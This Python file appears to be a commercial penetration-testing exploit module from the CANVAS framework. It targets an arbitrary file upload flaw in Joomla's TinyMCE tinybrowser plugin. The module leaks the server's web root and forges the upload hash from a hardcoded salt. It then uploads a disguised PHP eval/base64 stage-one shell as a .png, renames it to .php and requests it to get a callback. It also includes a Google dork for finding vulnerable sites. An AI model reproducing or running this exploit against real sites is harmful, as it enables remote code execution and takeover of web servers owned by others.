#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2011
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import random
import time
import re
import hashlib
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
#from tcpexploit import tcpexploit
from ExploitTypes.php_multi import *
import libs.spkproxy as spkproxy #for urlopen
import re

NAME                           = "Joomla TinyMCE upload"
VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ]
DESCRIPTION                    = "Joomla TinyMCE arbitrary file upload vulnerability"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "TinyMCE"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = ["http://developer.joomla.org/security/news/301-20090722-core-file-upload.html"]
DOCUMENTATION["CVE Name"]      = "N/A"
DOCUMENTATION["CVE URL"]       = "N/A"
DOCUMENTATION['CVSS']          = ""
DOCUMENTATION['Date public']   = ''
DOCUMENTATION['Google Dorks']  = ["inurl:/tiny_mce/plugins/tinybrowser",""]
DOCUMENTATION["Notes"]         = """
This will exploit the TinyMCE (tinybrowser) component in Joomla.
A correct path to the web root needs to be supplied (/var/www for example)
for this attack to succeed.  CANVAS will automatically try to enumerate this
via an information disclosure but if it fails you may need to set this manually
or hope that it's in the default of /var/www.

Just supply the path to the root of the joomla web folder that contains the
editor.  For example if you found joomla in http://target/joomla/ then supply
the exploit dialog with /joomla/ and CANVAS will do the rest for you.
"""

DOCUMENTATION["Known Vunlerable Versions"] = ["Tested on TinyMCE Major Version 3 Minor Version 3.9.2","Tested on Joomla 1.5.12 with tinyMCE 3 2.4.1"]

import urllib, time
from phplistener import get_php_stage1 #get our "Shellcode"

NOTES="""
tiny_mce_src.js:
	var tinymce = {
		majorVersion : '3',
		minorVersion : '3.9.2',
		releaseDate  : '2010-09-29',
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 1
        self.name               = NAME
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""
        self.basepath           = ""
        self.webserver          = ""
	self.testfile           = ""
	self.ssl                = 0
	self.allhosts           = []
	self.joomlawebroot      = "/var/www" #this is needed to compute an MD5 hash
	self.shellfile          = self.get_random_file(maxlength=6, filetype=".png").lower()
	self.callbackfile       = self.get_random_file(maxlength=6, filetype=".php").lower()
	self.uploadfile         = "/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload_file.php?obfuscate=REPLACEHASH&type=file&folder=/REPLACEPATH/images/stories/"
	self.renamefile         = "/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/edit.php?type=image&folder=/"
	self.versionfile        = "/plugins/editors/tinymce/jscripts/tiny_mce/tiny_mce_src.js"
	self.infodiscfile       = "/libraries/joomla/utilities/compat/php50x.php"


    def getargs(self):
        """
        Get arguments for attack
        """
        self.host     = self.target.interface
        self.basepath = self.argsDict.get("basepath", "/")
	self.ssl      = self.argsDict.get("checkbutton1", 0)
        self.getarg("port")
        self.getarg("hostname")
        if not self.hostname: self.hostname = self.host

    def test(self):
	return 1

    def make_joomla_payload(self):
	data = "--576a5sdf6\r\n"
	data += "Content-Disposition: form-data; name=\"Filedata\"; filename=\"%s\"\r\n\r\n" % self.shellfile
	data += """<?php eval(base64_decode("%s")); ?>\r\n""" % b64encode(self.get_php_to_mosdef()).strip()
	data += "--576a5sdf6--\r\n"
	return data

    def request1(self):
	"""
	Determine the web root via information disclosure and upload our initial .png file
	"""

	payload = self.make_joomla_payload()
	self.UA.addHeader("Content-Type", "multipart/form-data; boundary=576a5sdf6")

	##config_tinybrowser.php:$tinybrowser['obfuscate'] = 's0merand0mjunk!!!111';
	salt = "s0merand0mjunk!!!111"

	##attempt to get web root via information disclosure.
	response = self.UA.GET(self.infodiscfile)

	if "T_STRING" not in response:
            self.log("There was a problem in enumerating the internal web root.  You may have to set this yourself.  Assuming /var/www")
	else:
	    p = re.compile("expecting T_STRING.*in <b>([a-zA-Z1-9\-/]*?)%s" % self.basepath)
	    r = p.search(response).group(1)
	    self.log("Enumerated webroot via information disclosure %s" % r)
	    self.joomlawebroot = r

	h = hashlib.md5(self.joomlawebroot+salt).hexdigest()
	post = self.uploadfile.replace("REPLACEHASH", h).replace("REPLACEPATH", self.basepath)
	response = self.UA.POST(post, payload, noresponse = False)

	if "File Upload Success" in response:
	    self.log("Initial file upload succeeded!")

	else:
	    self.log("Something went wrong with the upload.  An MD5 hash is calculated from the web root (/var/www, etc).  You may need to doublecheck that you have that right")
	    return False

	##get rid of the multipart/form-data Content-Type so that the rest of our requests aren't messed up...
	self.UA.clearHeaders()
	return True

    def request2(self):
	"""
	By this time the file is uploaded into the root of joomla's web folder so now we rename the file and execute it
	"""

	cmd = "actionfile[0]=%s_&renameext[0]=php&renamefile[0]=%s.&sortby=name&sorttype=asc&find=&showpage=0&action=rename&commit="%(self.shellfile, self.callbackfile.split(".")[0])
	response = self.UA.POST(self.renamefile, cmd, noresponse=False)

	if "files encountered errors during the requested operation" in response:

	    self.log("Error occured while renaming the file!")
	    return False

	elif "successfully renamed." in response:

	    self.log("Shell successfully renamed!  Ready for execution...")

	    self.UA.GET("/images/stories/%s"%self.callbackfile)

	return True


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

